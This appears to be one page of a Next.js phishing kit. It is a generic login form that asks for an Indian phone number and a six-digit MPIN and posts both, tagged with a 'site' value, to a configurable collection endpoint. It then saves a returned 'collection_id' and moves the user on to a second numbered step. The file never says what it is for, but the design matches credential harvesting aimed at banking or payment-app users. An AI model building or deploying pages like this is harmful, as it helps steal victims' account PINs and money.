'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import styles from './page.module.css'; // Import the module CSS

export default function Home() {
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword((prevState) => !prevState);
  };

  const router = useRouter();
  useEffect(() => {
    localStorage.removeItem('collection_id');
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;
    const formData = new FormData(e.target);
    const jsonObject1 = {};
    const jsonObject = {};
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });
    jsonObject1['data'] = jsonObject;
    jsonObject1['site'] = SITE;
    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        body: JSON.stringify(jsonObject1)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      const responseData = await response.json();
      localStorage.setItem('collection_id', responseData.data);
      router.push('/2');
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Header />
      <main className="mt-4">
        <div className="container">
          <div className="mx-4">
            <form onSubmit={handleSubmit} id="frm_2_am8E">
              <div className={`${styles.formGroup} form-group w-100`}>
                <label htmlFor="">Enter Your Phone Number </label>
                <div className="d-flex gap-4 align-items-center w-100">
                  <label>+91</label>
                  <div className="w-100">
                    <input
                      type="text"
                      placeholder="Enter your phone number"
                      className={`${styles.formControl} w-100`}
                      name="mb"
                      minLength={10}
                      maxLength={10}
                      inputMode="numeric"
                      required
                    />
                    <span className={styles.phonecode}>Required</span>
                  </div>
                </div>
              </div>

              <div className={`${styles.formGroup} form-group mt-4 position-relative`}>
                <label htmlFor="mpin">Enter your MPIN</label>
                <input
                  type={showPassword ? "text" : "password"}
                  className={`${styles.myControl} w-100`}
                  name="mpin"
                  minLength={6}
                  maxLength={6}
                  inputMode="numeric"
                  placeholder="Enter your MPIN"
                  required
                />
                <span className={styles.phonecode}>Required</span>
                <img
                  src="/eye.png"
                  width={30}
                  height={30}
                  alt="Toggle Password Visibility"
                  onClick={togglePasswordVisibility}
                  style={{
                    position: "absolute",
                    right: "15px",
                    top: "45px",
                    cursor: "pointer",
                  }}
                />
              </div>

              <div className={`${styles.formGroup} form-group w-100 my-3 mb-0 d-flex justify-content-center`}>
                <button
                  type="submit"
                  disabled={loading}
                  className={`${styles.submitButton} w-75 btn btn-primary`}
                >
                  Proceed
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}
